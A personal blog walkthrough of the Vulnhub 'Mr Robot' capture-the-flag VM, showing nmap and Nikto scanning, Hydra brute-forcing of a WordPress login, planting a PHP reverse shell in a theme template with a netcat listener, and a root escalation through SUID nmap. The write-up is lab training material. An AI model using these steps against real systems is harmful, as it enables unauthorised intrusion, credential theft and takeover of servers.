---
title:  "Vulnhub: Mr Robot - Walkthrough"
date:   2019-04-24 15:04:23
---

This might officially be the first box that i've ever attempted. I was a total pleb at the time and it took me hella long to figure it all out. In the end it was all worth it :)

<h2>Description from author</h2>
Based on the show, Mr. Robot.
This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.
The VM isn’t too difficult. There isn’t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.

<h2>Information Gathering</h2>
Let’s start with a simple port scan.

```
mkdir scans
nmap -sC -Pn -sV -oA scans/nmap_initial 10.0.2.4
```

![](/assets/1/1.png)

Nothing too interesting, just a webserver running on the background and ssh. Let’s run Nikto in the background when we’re going to manually enumerate the web application.

```
nikto -h 10.0.2.4 -o scans/nikto.txt
```

Searched for common files and folders and found something interesting in /robots.txt!

![](/assets/1/2.png)

Great, the 1st out of 3 keys has been found. We also found an interesting .dic file. I downloaded them with wget. Going through the .dic file i found out that there were alot of duplicates, so i decided to sort the list and save it for later use.

```
cat fsocity.dic| sort -u | uniq > uniq_fsocity.dic
```

In the meantime our Nikto scan hs finished, let’s take a look at the results.

![](/assets/1/3.png)

WordPress is running in the background. The first thing i do when i know WordPress is installed is run wpscan but nothing too interesting came up. It wasn’t able to enumerate users either.

Luckily for us, we know we can bruteforce user and password in a HTTP form with Hydra. Here is the POST request made when we try to login in /wp-login.php

![](/assets/1/4.png)

In the POST request 2 parameters are being used; log and pwd. Let’s run Hydra to figure out the username and password!

```
hydra -vV -L uniq_fsocity.dic -p jiebs 10.0.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

After abit of waiting we get the username.

```
[80][http-post-form] host: 10.0.2.4 login: elliot password: jiebs
```

Let’s try and grab the password with the same .dic file now.

```
hydra -vV -l elliot -P uniq_fsocity.dic 10.0.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
```

Again after a bit of waiting we get the password.

```
[80][http-post-form] host: 10.0.2.4 login: elliot password: ER28-0652
```

Great, we have the username and password. Let’s log in and start the exploitation part!

<h2>Exploitation</h2>
After some poking around in the wp admin panel i figured i should try and upload a reverse shell. I got mine from pentestmonkeys, make sure you change the ip and port. Go to Appearance > Editor > 404 Template (404.php) > paste the .php script > click Upload.

![](/assets/1/5.png)

Let’s make sure we’re listening to the port.

```
nc -lvp 1234
```

Once you’re listening to the port lets get our reverse shell going.

```
curl http://10.0.2.4/404.php
```

![](/assets/1/6.png)

Great, our reverse shell is running. Let’s quickly spawn a TTY shell and start snooping around!

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

After searching around i found an interesting directory(/home/robot) with the 2nd key!

![](/assets/1/7.png)

I tried to cat the 2nd key, however we get permission denied. Luckily we noticed the password.raw-md5 file which sounds really interesting!

![](/assets/1/8.png)

Looks like a password hash for the robot user! I went online and cracked the hash, result: “abcdefghijklmnopqrstuvwxyz”. Let’s go ahead and switch to the robot user.

![](/assets/1/9.png)

Let’s see if we can cat the 2nd key now that we’re on a low privileged user.

![](/assets/1/10.png)

Great, now lets move and get root!

<h2>Privilege escalation</h2>
After going through a bunch of directories and files looking for hints, i started looking at binaries with the SUID bit set.

![](/assets/1/11.png)

We can run nmap as root since it’s SUID bit is set. Let’s check out the version. In older versions of nmap you are able to run it in interactive mode and escape to shell. Since the SUID bit is set, we’ll be able to escape to ‘root’ shell.

![](/assets/1/12.png)

Let’s check out the root directory for the last flag.

![](/assets/1/13.png)

Thanks for reading and happy hacking!
